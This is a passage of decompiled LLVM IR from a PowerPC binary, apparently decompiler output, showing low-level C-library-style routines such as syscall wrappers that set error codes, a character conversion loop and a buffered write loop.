  br i1 %v3_10009288, label %dec_label_pc_100092a0, label %dec_label_pc_10009294

dec_label_pc_10009294:                            ; preds = %dec_label_pc_1000926c
  %v0_10009294 = call i32 @function_10004b48()
  %v0_10009298 = load i32, i32* %r31.global-to-local, align 4
  %v2_10009298 = inttoptr i32 %v0_10009294 to i32*
  store i32 %v0_10009298, i32* %v2_10009298, align 4
  br label %dec_label_pc_100092a0

dec_label_pc_100092a0:                            ; preds = %dec_label_pc_1000926c, %dec_label_pc_10009294
  %v0_100092b0 = phi i32 [ %v0_10009284, %dec_label_pc_1000926c ], [ -1, %dec_label_pc_10009294 ]
  ret i32 %v0_100092b0

; uselistorder directives
  uselistorder label %dec_label_pc_100092a0, { 1, 0 }
}

define i32 @function_100092b4(i32 %arg1) local_unnamed_addr {
dec_label_pc_100092b4:
  %r31.global-to-local = alloca i32, align 4
  %v0_100092cc = call i32 @__asm_mfcr()
  %v1_100092d0 = and i32 %v0_100092cc, 268435456
  %v3_100092d0 = icmp eq i32 %v1_100092d0, 0
  store i32 %v0_100092cc, i32* %r31.global-to-local, align 4
  br i1 %v3_100092d0, label %dec_label_pc_100092e8, label %dec_label_pc_100092dc

dec_label_pc_100092dc:                            ; preds = %dec_label_pc_100092b4
  %v0_100092dc = call i32 @function_10004b48()
  %v0_100092e0 = load i32, i32* %r31.global-to-local, align 4
  %v2_100092e0 = inttoptr i32 %v0_100092dc to i32*
  store i32 %v0_100092e0, i32* %v2_100092e0, align 4
  br label %dec_label_pc_100092e8

dec_label_pc_100092e8:                            ; preds = %dec_label_pc_100092b4, %dec_label_pc_100092dc
  %v0_100092f8 = phi i32 [ %v0_100092cc, %dec_label_pc_100092b4 ], [ -1, %dec_label_pc_100092dc ]
  ret i32 %v0_100092f8

; uselistorder directives
  uselistorder label %dec_label_pc_100092e8, { 1, 0 }
}

define i32 @function_100092fc(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_100092fc:
  %r31.global-to-local = alloca i32, align 4
  %v0_10009314 = call i32 @__asm_mfcr()
  %v1_10009318 = and i32 %v0_10009314, 268435456
  %v3_10009318 = icmp eq i32 %v1_10009318, 0
  store i32 %v0_10009314, i32* %r31.global-to-local, align 4
  br i1 %v3_10009318, label %dec_label_pc_10009330, label %dec_label_pc_10009324

dec_label_pc_10009324:                            ; preds = %dec_label_pc_100092fc
  %v0_10009324 = call i32 @function_10004b48()
  %v0_10009328 = load i32, i32* %r31.global-to-local, align 4
  %v2_10009328 = inttoptr i32 %v0_10009324 to i32*
  store i32 %v0_10009328, i32* %v2_10009328, align 4
  br label %dec_label_pc_10009330

dec_label_pc_10009330:                            ; preds = %dec_label_pc_100092fc, %dec_label_pc_10009324
  %v0_10009340 = phi i32 [ %v0_10009314, %dec_label_pc_100092fc ], [ -1, %dec_label_pc_10009324 ]
  ret i32 %v0_10009340

; uselistorder directives
  uselistorder label %dec_label_pc_10009330, { 1, 0 }
}

define i32 @function_10009344(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10009344:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v1_10009354 = and i32 %arg2, 64
  %v3_10009354 = icmp eq i32 %v1_10009354, 0
  br i1 %v3_10009354, label %dec_label_pc_10009384, label %dec_label_pc_10009368

dec_label_pc_10009368:                            ; preds = %dec_label_pc_10009344
  %v2_10009370 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_10009370, i32* %stack_var_-32, align 4
  %v0_10009380 = load i32, i32* @r5, align 4
  br label %dec_label_pc_10009384

dec_label_pc_10009384:                            ; preds = %dec_label_pc_10009344, %dec_label_pc_10009368
  %v0_10009384 = phi i32 [ 0, %dec_label_pc_10009344 ], [ %v0_10009380, %dec_label_pc_10009368 ]
  store i32 %v0_10009384, i32* @r5, align 4
  %v0_1000938c = call i32 @__asm_mfcr()
  %v1_10009390 = and i32 %v0_1000938c, 268435456
  %v3_10009390 = icmp eq i32 %v1_10009390, 0
  store i32 %v0_1000938c, i32* %r31.global-to-local, align 4
  br i1 %v3_10009390, label %dec_label_pc_100093a8, label %dec_label_pc_1000939c

dec_label_pc_1000939c:                            ; preds = %dec_label_pc_10009384
  %v0_1000939c = call i32 @function_10004b48()
  %v0_100093a0 = load i32, i32* %r31.global-to-local, align 4
  %v2_100093a0 = inttoptr i32 %v0_1000939c to i32*
  store i32 %v0_100093a0, i32* %v2_100093a0, align 4
  br label %dec_label_pc_100093a8

dec_label_pc_100093a8:                            ; preds = %dec_label_pc_10009384, %dec_label_pc_1000939c
  %v0_100093b8 = phi i32 [ %v0_1000938c, %dec_label_pc_10009384 ], [ -1, %dec_label_pc_1000939c ]
  ret i32 %v0_100093b8

; uselistorder directives
  uselistorder label %dec_label_pc_100093a8, { 1, 0 }
  uselistorder label %dec_label_pc_10009384, { 1, 0 }
}

define i32 @function_100093bc(i32 %arg1) local_unnamed_addr {
dec_label_pc_100093bc:
  store i32 %arg1, i32* @r5, align 4
  %v2_100093c8 = call i32 @function_10009344(i32 577, i32 577)
  ret i32 %v2_100093c8

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_10009344, { 2, 0, 1 }
  uselistorder i32 577, { 1, 2, 0, 3 }
}

define i32 @function_100093cc(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_100093cc:
  %r31.global-to-local = alloca i32, align 4
  %v0_100093e4 = call i32 @__asm_mfcr()
  %v1_100093e8 = and i32 %v0_100093e4, 268435456
  %v3_100093e8 = icmp eq i32 %v1_100093e8, 0
  store i32 %v0_100093e4, i32* %r31.global-to-local, align 4
  br i1 %v3_100093e8, label %dec_label_pc_10009400, label %dec_label_pc_100093f4

dec_label_pc_100093f4:                            ; preds = %dec_label_pc_100093cc
  %v0_100093f4 = call i32 @function_10004b48()
  %v0_100093f8 = load i32, i32* %r31.global-to-local, align 4
  %v2_100093f8 = inttoptr i32 %v0_100093f4 to i32*
  store i32 %v0_100093f8, i32* %v2_100093f8, align 4
  br label %dec_label_pc_10009400

dec_label_pc_10009400:                            ; preds = %dec_label_pc_100093cc, %dec_label_pc_100093f4
  %v0_10009410 = phi i32 [ %v0_100093e4, %dec_label_pc_100093cc ], [ -1, %dec_label_pc_100093f4 ]
  ret i32 %v0_10009410

; uselistorder directives
  uselistorder label %dec_label_pc_10009400, { 1, 0 }
}

define i32 @function_10009414(i32 %arg1) local_unnamed_addr {
dec_label_pc_10009414:
  store i32 %arg1, i32* @r30, align 4
  %v3_10009430 = load i32, i32* @global_var_100104dc.287, align 4
  %v3_10009434 = icmp eq i32 %v3_10009430, 0
  br i1 %v3_10009434, label %dec_label_pc_1000943c, label %dec_label_pc_10009448

dec_label_pc_1000943c:                            ; preds = %dec_label_pc_10009414
  store i32 268473408, i32* @lr, align 4
  %v1_1000943c = call i32 @function_1000b538(i32 0)
  %v1_10009440 = icmp slt i32 %v1_1000943c, 0
  br i1 %v1_10009440, label %dec_label_pc_10009470, label %dec_label_pc_1000943c.dec_label_pc_10009448_crit_edge

dec_label_pc_1000943c.dec_label_pc_10009448_crit_edge: ; preds = %dec_label_pc_1000943c
  %v0_10009448.pre = load i32, i32* @r30, align 4
  %v3_1000944c.pre = load i32, i32* @global_var_100104dc.287, align 4
  br label %dec_label_pc_10009448

dec_label_pc_10009448:                            ; preds = %dec_label_pc_1000943c.dec_label_pc_10009448_crit_edge, %dec_label_pc_10009414
  %v3_1000944c = phi i32 [ %v3_1000944c.pre, %dec_label_pc_1000943c.dec_label_pc_10009448_crit_edge ], [ %v3_10009430, %dec_label_pc_10009414 ]
  %v1_10009460 = phi i32 [ %v0_10009448.pre, %dec_label_pc_1000943c.dec_label_pc_10009448_crit_edge ], [ %arg1, %dec_label_pc_10009414 ]
  %v3_10009448 = icmp eq i32 %v1_10009460, 0
  store i32 %v3_1000944c, i32* @r31, align 4
  br i1 %v3_10009448, label %dec_label_pc_10009474, label %dec_label_pc_1000945c

dec_label_pc_1000945c:                            ; preds = %dec_label_pc_10009448
  %v2_10009460 = add i32 %v1_10009460, %v3_1000944c
  store i32 268473448, i32* @lr, align 4
  %v1_10009464 = call i32 @function_1000b538(i32 %v2_10009460)
  %tmp6 = icmp sgt i32 %v1_10009464, -1
  br i1 %tmp6, label %dec_label_pc_1000945c.dec_label_pc_10009474_crit_edge, label %dec_label_pc_10009470

dec_label_pc_1000945c.dec_label_pc_10009474_crit_edge: ; preds = %dec_label_pc_1000945c
  %v0_10009478.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10009474

dec_label_pc_10009470:                            ; preds = %dec_label_pc_1000945c, %dec_label_pc_1000943c
  store i32 -1, i32* @r31, align 4
  br label %dec_label_pc_10009474

dec_label_pc_10009474:                            ; preds = %dec_label_pc_1000945c.dec_label_pc_10009474_crit_edge, %dec_label_pc_10009448, %dec_label_pc_10009470
  %v0_10009478 = phi i32 [ %v0_10009478.pre, %dec_label_pc_1000945c.dec_label_pc_10009474_crit_edge ], [ %v3_1000944c, %dec_label_pc_10009448 ], [ -1, %dec_label_pc_10009470 ]
  ret i32 %v0_10009478

; uselistorder directives
  uselistorder i32 %v3_1000944c, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_1000b538, { 1, 0 }
  uselistorder label %dec_label_pc_10009474, { 2, 0, 1 }
}

define i32 @function_1000948c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000948c:
  %r31.global-to-local = alloca i32, align 4
  %v3_10009494 = icmp eq i32 %arg2, 0
  br i1 %v3_10009494, label %dec_label_pc_100094cc, label %dec_label_pc_100094b4

dec_label_pc_100094b4:                            ; preds = %dec_label_pc_1000948c
  store i32 -1, i32* %r31.global-to-local, align 4
  %tmp5 = icmp ult i32 %arg1, 3
  br i1 %tmp5, label %dec_label_pc_100094cc, label %dec_label_pc_100094bc

dec_label_pc_100094bc:                            ; preds = %dec_label_pc_100094b4
  %v0_100094bc = call i32 @function_10004b48()
  %v2_100094c4 = inttoptr i32 %v0_100094bc to i32*
  store i32 22, i32* %v2_100094c4, align 4
  %v0_100094f0.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100094ec

dec_label_pc_100094cc:                            ; preds = %dec_label_pc_100094b4, %dec_label_pc_1000948c
  %v0_100094d0 = call i32 @__asm_mfcr()
  %v1_100094d4 = and i32 %v0_100094d0, 268435456
  %v3_100094d4 = icmp eq i32 %v1_100094d4, 0
  store i32 %v0_100094d0, i32* %r31.global-to-local, align 4
  br i1 %v3_100094d4, label %dec_label_pc_100094ec, label %dec_label_pc_100094e0

dec_label_pc_100094e0:                            ; preds = %dec_label_pc_100094cc
  %v0_100094e0 = call i32 @function_10004b48()
  %v0_100094e4 = load i32, i32* %r31.global-to-local, align 4
  %v2_100094e4 = inttoptr i32 %v0_100094e0 to i32*
  store i32 %v0_100094e4, i32* %v2_100094e4, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100094ec

dec_label_pc_100094ec:                            ; preds = %dec_label_pc_100094cc, %dec_label_pc_100094bc, %dec_label_pc_100094e0
  %v0_100094f0 = phi i32 [ %v0_100094d0, %dec_label_pc_100094cc ], [ %v0_100094f0.pre, %dec_label_pc_100094bc ], [ -1, %dec_label_pc_100094e0 ]
  ret i32 %v0_100094f0

; uselistorder directives
  uselistorder label %dec_label_pc_100094ec, { 2, 0, 1 }
}

define i32 @function_10009504(i32 %arg1) local_unnamed_addr {
dec_label_pc_10009504:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000951c = call i32 @__asm_mfcr()
  %v1_10009520 = and i32 %v0_1000951c, 268435456
  %v3_10009520 = icmp eq i32 %v1_10009520, 0
  store i32 %v0_1000951c, i32* %r31.global-to-local, align 4
  br i1 %v3_10009520, label %dec_label_pc_10009538, label %dec_label_pc_1000952c

dec_label_pc_1000952c:                            ; preds = %dec_label_pc_10009504
  %v0_1000952c = call i32 @function_10004b48()
  %v0_10009530 = load i32, i32* %r31.global-to-local, align 4
  %v2_10009530 = inttoptr i32 %v0_1000952c to i32*
  store i32 %v0_10009530, i32* %v2_10009530, align 4
  br label %dec_label_pc_10009538

dec_label_pc_10009538:                            ; preds = %dec_label_pc_10009504, %dec_label_pc_1000952c
  %v0_10009548 = phi i32 [ %v0_1000951c, %dec_label_pc_10009504 ], [ -1, %dec_label_pc_1000952c ]
  ret i32 %v0_10009548

; uselistorder directives
  uselistorder label %dec_label_pc_10009538, { 1, 0 }
}

define i32 @function_1000954c() local_unnamed_addr {
dec_label_pc_1000954c:
  ret i32 ptrtoint (i32* @global_var_100104c0.289 to i32)
}

define i32 @function_10009558(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10009558:
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_10009560 = icmp eq i32 %arg1, 0
  store i32 16, i32* @r6, align 4
  %v2_10009574 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_10009574, i32* @r4, align 4
  store i32 1, i32* @r5, align 4
  br i1 %v3_10009560, label %dec_label_pc_10009580, label %dec_label_pc_10009588

dec_label_pc_10009580:                            ; preds = %dec_label_pc_10009558
  %v2_10009580 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_10009580, i32* @r3, align 4
  br label %dec_label_pc_10009588

dec_label_pc_10009588:                            ; preds = %dec_label_pc_10009558, %dec_label_pc_10009580
  %v0_1000958c = phi i32 [ %arg2, %dec_label_pc_10009558 ], [ 0, %dec_label_pc_10009580 ]
  %v2_10009588 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v0_1000958c, i32* %stack_var_-40, align 4
  store i32 %v2_10009588, i32* %stack_var_-36, align 4
  store i32 268473752, i32* @lr, align 4
  %v0_10009594 = call i32 @function_100095c4()
  %v3_10009598 = icmp eq i32 %v0_10009594, 0
  br i1 %v3_10009598, label %dec_label_pc_100095a0, label %dec_label_pc_100095a4

dec_label_pc_100095a0:                            ; preds = %dec_label_pc_10009588
  br label %dec_label_pc_100095a4

dec_label_pc_100095a4:                            ; preds = %dec_label_pc_10009588, %dec_label_pc_100095a0
  %v0_100095b0 = phi i32 [ %v0_10009594, %dec_label_pc_10009588 ], [ 1, %dec_label_pc_100095a0 ]
  ret i32 %v0_100095b0

; uselistorder directives
  uselistorder label %dec_label_pc_100095a4, { 1, 0 }
  uselistorder label %dec_label_pc_10009588, { 1, 0 }
}

define i32 @function_100095b4() local_unnamed_addr {
dec_label_pc_100095b4:
  %v0_100095b8 = load i32, i32* @r5, align 4
  store i32 %v0_100095b8, i32* @r6, align 4
  store i32 -1, i32* @r5, align 4
  %v0_100095c0 = call i32 @function_100095c4()
  ret i32 %v0_100095c0

; uselistorder directives
  uselistorder i32 ()* @function_100095c4, { 1, 0 }
}

define i32 @function_100095c4() local_unnamed_addr {
dec_label_pc_100095c4:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_100095c8 = load i32, i32* @lr, align 4
  store i32 %v0_100095c8, i32* %r0.global-to-local, align 4
  %v0_100095cc = load i32, i32* @r3, align 4
  %v3_100095cc = icmp eq i32 %v0_100095cc, 0
  br i1 %v3_100095cc, label %dec_label_pc_100095f0, label %dec_label_pc_100095d8

dec_label_pc_100095d8:                            ; preds = %dec_label_pc_100095c4
  %v1_100095d8 = load i32, i32* @r4, align 4
  %v4_100095d8 = icmp eq i32 %v0_100095cc, %v1_100095d8
  store i32 1, i32* %r10.global-to-local, align 4
  br i1 %v4_100095d8, label %dec_label_pc_100095e4, label %dec_label_pc_1000961c

dec_label_pc_100095e4:                            ; preds = %dec_label_pc_100095d8
  %v2_100095e8 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_100095e8, i32* @r3, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000961c

dec_label_pc_100095f0:                            ; preds = %dec_label_pc_100095c4
  %v2_100095e811 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_100095e811, i32* @r3, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 -1, i32* @r6, align 4
  br label %dec_label_pc_1000961c

dec_label_pc_100095fc:                            ; preds = %dec_label_pc_1000965c.dec_label_pc_1000963c_crit_edge, %dec_label_pc_1000963c.preheader
  %v0_100095fc = call i32 @function_10004b48()
  store i32 84, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r5.global-to-local, align 4
  %v2_10009608 = inttoptr i32 %v0_100095fc to i32*
  store i32 84, i32* %v2_10009608, align 4
  %v0_10009680.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000967c

dec_label_pc_10009610:                            ; preds = %dec_label_pc_1000964c
  store i32 0, i32* %r11.global-to-local, align 4
  %v0_1000966c.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10009668

dec_label_pc_1000961c:                            ; preds = %dec_label_pc_100095e4, %dec_label_pc_100095d8, %dec_label_pc_100095f0
  %v2_1000964c7 = phi i32 [ %v2_100095e8, %dec_label_pc_100095e4 ], [ %v0_100095cc, %dec_label_pc_100095d8 ], [ %v2_100095e811, %dec_label_pc_100095f0 ]
  %v0_1000961c = load i32, i32* @r5, align 4
  %v1_1000961c = load i32, i32* @r6, align 4
  %v3_1000961c = icmp ugt i32 %v0_1000961c, %v1_1000961c
  br i1 %v3_1000961c, label %dec_label_pc_10009624, label %dec_label_pc_10009628

dec_label_pc_10009624:                            ; preds = %dec_label_pc_1000961c
  store i32 %v1_1000961c, i32* @r5, align 4
  br label %dec_label_pc_10009628

dec_label_pc_10009628:                            ; preds = %dec_label_pc_1000961c, %dec_label_pc_10009624
  %v0_10009634 = phi i32 [ %v0_1000961c, %dec_label_pc_1000961c ], [ %v1_1000961c, %dec_label_pc_10009624 ]
  %v1_10009628 = add i32 %v0_10009634, 1
  store i32 %v1_10009628, i32* %r0.global-to-local, align 4
  %v0_1000962c = load i32, i32* @r4, align 4
  %v1_1000962c = inttoptr i32 %v0_1000962c to i32*
  %v2_1000962c = load i32, i32* %v1_1000962c, align 4
  store i32 %v2_1000962c, i32* %r11.global-to-local, align 4
  store i32 %v0_10009634, i32* %r9.global-to-local, align 4
  store i32 %v0_10009634, i32* %ctr.global-to-local, align 4
  %v2_100096643 = icmp eq i32 %v0_10009634, 0
  br i1 %v2_100096643, label %dec_label_pc_10009668, label %dec_label_pc_1000963c.preheader

dec_label_pc_1000963c.preheader:                  ; preds = %dec_label_pc_10009628
  %v1_1000963c16 = inttoptr i32 %v2_1000962c to i32*
  %v2_1000963c17 = load i32, i32* %v1_1000963c16, align 4
  store i32 %v2_1000963c17, i32* %r0.global-to-local, align 4
  %v1_1000964018 = add i32 %v2_1000962c, 4
  store i32 %v1_1000964018, i32* %r11.global-to-local, align 4
  %v2_1000964420 = icmp ugt i32 %v2_1000963c17, 127
  br i1 %v2_1000964420, label %dec_label_pc_100095fc, label %dec_label_pc_1000964c.lr.ph

dec_label_pc_1000964c.lr.ph:                      ; preds = %dec_label_pc_1000963c.preheader
  %extract.t = trunc i32 %v2_1000963c17 to i8
  br label %dec_label_pc_1000964c

dec_label_pc_1000964c:                            ; preds = %dec_label_pc_1000964c.lr.ph, %dec_label_pc_1000965c.dec_label_pc_1000963c_crit_edge
  %v2_1000963c23.off0 = phi i8 [ %extract.t, %dec_label_pc_1000964c.lr.ph ], [ %extract.t24, %dec_label_pc_1000965c.dec_label_pc_1000963c_crit_edge ]
  %v2_1000964c22 = phi i32 [ %v2_1000964c7, %dec_label_pc_1000964c.lr.ph ], [ %v2_1000965c, %dec_label_pc_1000965c.dec_label_pc_1000963c_crit_edge ]
  %v3_1000964c = inttoptr i32 %v2_1000964c22 to i8*
  store i8 %v2_1000963c23.off0, i8* %v3_1000964c, align 1
  %v0_10009650 = load i32, i32* %r0.global-to-local, align 4
  %v1_10009650 = urem i32 %v0_10009650, 256
  store i32 %v1_10009650, i32* %r0.global-to-local, align 4
  %v3_10009654 = icmp eq i32 %v1_10009650, 0
  br i1 %v3_10009654, label %dec_label_pc_10009610, label %dec_label_pc_1000965c

dec_label_pc_1000965c:                            ; preds = %dec_label_pc_1000964c
  %v0_1000965c = load i32, i32* @r3, align 4
  %v1_1000965c = load i32, i32* %r10.global-to-local, align 4
  %v2_1000965c = add i32 %v1_1000965c, %v0_1000965c
  store i32 %v2_1000965c, i32* @r3, align 4
  %v0_10009660 = load i32, i32* %r9.global-to-local, align 4
  %v1_10009660 = add i32 %v0_10009660, -1
  store i32 %v1_10009660, i32* %r9.global-to-local, align 4
  %v0_10009664 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10009664 = add i32 %v0_10009664, -1
  store i32 %v1_10009664, i32* %ctr.global-to-local, align 4
  %v2_10009664 = icmp eq i32 %v1_10009664, 0
  br i1 %v2_10009664, label %dec_label_pc_10009668, label %dec_label_pc_1000965c.dec_label_pc_1000963c_crit_edge

dec_label_pc_1000965c.dec_label_pc_1000963c_crit_edge: ; preds = %dec_label_pc_1000965c
  %v0_1000963c.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_1000963c = inttoptr i32 %v0_1000963c.pre to i32*
  %v2_1000963c = load i32, i32* %v1_1000963c, align 4
  store i32 %v2_1000963c, i32* %r0.global-to-local, align 4
  %v1_10009640 = add i32 %v0_1000963c.pre, 4
  store i32 %v1_10009640, i32* %r11.global-to-local, align 4
  %v2_10009644 = icmp ugt i32 %v2_1000963c, 127
  %extract.t24 = trunc i32 %v2_1000963c to i8
  br i1 %v2_10009644, label %dec_label_pc_100095fc, label %dec_label_pc_1000964c

dec_label_pc_10009668:                            ; preds = %dec_label_pc_1000965c, %dec_label_pc_10009628, %dec_label_pc_10009610
  %v0_1000966c = phi i32 [ %v0_1000966c.pre, %dec_label_pc_10009610 ], [ %v2_1000964c7, %dec_label_pc_10009628 ], [ %v2_1000965c, %dec_label_pc_1000965c ]
  %v2_10009668 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_10009668, i32* %r0.global-to-local, align 4
  %v4_1000966c = icmp eq i32 %v0_1000966c, %v2_10009668
  br i1 %v4_1000966c, label %dec_label_pc_10009678, label %dec_label_pc_10009674

dec_label_pc_10009674:                            ; preds = %dec_label_pc_10009668
  %v0_10009674 = load i32, i32* %r11.global-to-local, align 4
  %v1_10009674 = load i32, i32* @r4, align 4
  %v2_10009674 = inttoptr i32 %v1_10009674 to i32*
  store i32 %v0_10009674, i32* %v2_10009674, align 4
  br label %dec_label_pc_10009678

dec_label_pc_10009678:                            ; preds = %dec_label_pc_10009668, %dec_label_pc_10009674
  %v0_10009678 = load i32, i32* %r9.global-to-local, align 4
  %v1_10009678 = load i32, i32* @r5, align 4
  %v2_10009678 = sub i32 %v1_10009678, %v0_10009678
  store i32 %v2_10009678, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000967c

dec_label_pc_1000967c:                            ; preds = %dec_label_pc_100095fc, %dec_label_pc_10009678
  %v0_10009680 = phi i32 [ %v0_10009680.pre, %dec_label_pc_100095fc ], [ %v2_10009678, %dec_label_pc_10009678 ]
  store i32 %v0_100095c8, i32* %r0.global-to-local, align 4
  ret i32 %v0_10009680

; uselistorder directives
  uselistorder i32 %v1_10009664, { 1, 0 }
  uselistorder i32 %v2_1000965c, { 0, 2, 1 }
  uselistorder i32 %v1_10009650, { 1, 0 }
  uselistorder i32 %v0_10009634, { 2, 3, 0, 1 }
  uselistorder i32 %v2_1000964c7, { 1, 0 }
  uselistorder i32* %stack_var_-24, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 1, 3, 2, 0 }
  uselistorder i32* %r11.global-to-local, { 4, 3, 2, 0, 5, 1 }
  uselistorder i32* %r10.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 6, 3, 5, 0, 7, 4, 8 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0 }
  uselistorder i32 84, { 4, 5, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1000967c, { 1, 0 }
  uselistorder label %dec_label_pc_10009678, { 1, 0 }
  uselistorder label %dec_label_pc_1000964c, { 1, 0 }
  uselistorder label %dec_label_pc_10009628, { 1, 0 }
  uselistorder label %dec_label_pc_1000961c, { 2, 0, 1 }
}

define i32 @function_10009690(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10009690:
  %v0_10009694 = load i32, i32* @lr, align 4
  store i32 268474036, i32* @lr, align 4
  %v2_100096b0 = call i32 @function_10009028(i32 3, i32 3)
  %v3_100096b4 = icmp eq i32 %v2_100096b0, -1
  store i32 %arg1, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  br i1 %v3_100096b4, label %dec_label_pc_100096dc, label %dec_label_pc_100096c8

dec_label_pc_100096c8:                            ; preds = %dec_label_pc_10009690
  store i32 %v0_10009694, i32* @lr, align 4
  %v4_100096d8 = inttoptr i32 %arg2 to i8*
  %v5_100096d8 = call i32 @function_10005144(i32 %v2_100096b0, i8* %v4_100096d8)
  br label %dec_label_pc_100096dc

dec_label_pc_100096dc:                            ; preds = %dec_label_pc_10009690, %dec_label_pc_100096c8
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_10009028, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100096dc, { 1, 0 }
}

define i32 @function_100096f4(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_100096f4:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_100096f8 = load i32, i32* @lr, align 4
  store i32 %v0_100096f8, i32* %r0.global-to-local, align 4
  %v0_10009704 = load i32, i32* @r5, align 4
  store i32 %v0_10009704, i32* @r28, align 4
  store i32 %tmp, i32* @r30, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %v0_10009704, i32* @r31, align 4
  %v3_100097143 = icmp eq i32 %v0_10009704, 0
  br i1 %v3_100097143, label %dec_label_pc_100097bc, label %dec_label_pc_10009720

dec_label_pc_10009720:                            ; preds = %dec_label_pc_100096f4, %dec_label_pc_10009744
  %v0_10009734 = phi i32 [ %v2_10009744, %dec_label_pc_10009744 ], [ %arg2, %dec_label_pc_100096f4 ]
  %v0_10009720 = phi i32 [ %v2_10009748, %dec_label_pc_10009744 ], [ %v0_10009704, %dec_label_pc_100096f4 ]
  %v1_10009724.in = phi i32 [ %v2_10009748, %dec_label_pc_10009744 ], [ %v0_10009704, %dec_label_pc_100096f4 ]
  %v1_10009724 = icmp sgt i32 %v1_10009724.in, 0
  store i32 %v0_10009720, i32* @r27, align 4
  br i1 %v1_10009724, label %dec_label_pc_10009730, label %dec_label_pc_10009728

dec_label_pc_10009728:                            ; preds = %dec_label_pc_10009720
  br label %dec_label_pc_10009730

dec_label_pc_10009730:                            ; preds = %dec_label_pc_10009720, %dec_label_pc_10009728
  %v0_10009730 = load i32, i32* @r30, align 4
  %v1_10009730 = add i32 %v0_10009730, 4
  %v2_10009730 = inttoptr i32 %v1_10009730 to i32*
  %v3_10009730 = load i32, i32* %v2_10009730, align 4
  store i32 268474172, i32* @lr, align 4
  %v3_10009738 = call i32 @function_10004ae0(i32 %v3_10009730, i32 %v0_10009734)
  %v1_1000973c = icmp slt i32 %v3_10009738, 0
  br i1 %v1_1000973c, label %dec_label_pc_10009750, label %dec_label_pc_10009744

dec_label_pc_10009744:                            ; preds = %dec_label_pc_10009730
  %v0_10009744 = load i32, i32* @r29, align 4
  %v2_10009744 = add i32 %v0_10009744, %v3_10009738
  store i32 %v2_10009744, i32* @r29, align 4
  %v1_10009748 = load i32, i32* @r31, align 4
  %v2_10009748 = sub i32 %v1_10009748, %v3_10009738
  store i32 %v2_10009748, i32* @r31, align 4
  %v3_10009714 = icmp eq i32 %v2_10009748, 0
  br i1 %v3_10009714, label %dec_label_pc_10009714.dec_label_pc_100097bc.loopexit_crit_edge, label %dec_label_pc_10009720

dec_label_pc_10009750:                            ; preds = %dec_label_pc_10009730
  %v0_10009750 = load i32, i32* @r30, align 4
  %v1_10009750 = add i32 %v0_10009750, 8
  %v2_10009750 = inttoptr i32 %v1_10009750 to i32*
  %v3_10009750 = load i32, i32* %v2_10009750, align 4
  store i32 %v3_10009750, i32* %r11.global-to-local, align 4
  %v1_10009754 = add i32 %v0_10009750, 12
  %v2_10009754 = inttoptr i32 %v1_10009754 to i32*
  %v3_10009754 = load i32, i32* %v2_10009754, align 4
  store i32 %v3_10009754, i32* %r0.global-to-local, align 4
  %v1_10009758 = inttoptr i32 %v0_10009750 to i16*
  %v2_10009758 = load i16, i16* %v1_10009758, align 2
  %v2_1000975c = sub i32 %v3_10009754, %v3_10009750
  store i32 %v2_1000975c, i32* %r0.global-to-local, align 4
  %v5_1000975c = icmp eq i32 %v2_1000975c, 0
  %v1_10009760 = or i16 %v2_10009758, 8
  store i16 %v1_10009760, i16* %v1_10009758, align 2
  br i1 %v5_1000975c, label %dec_label_pc_10009750.dec_label_pc_100097b8_crit_edge, label %dec_label_pc_1000976c

dec_label_pc_10009750.dec_label_pc_100097b8_crit_edge: ; preds = %dec_label_pc_10009750
  %v0_100097b8.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100097b8

dec_label_pc_1000976c:                            ; preds = %dec_label_pc_10009750
  %v0_1000976c = load i32, i32* %r0.global-to-local, align 4
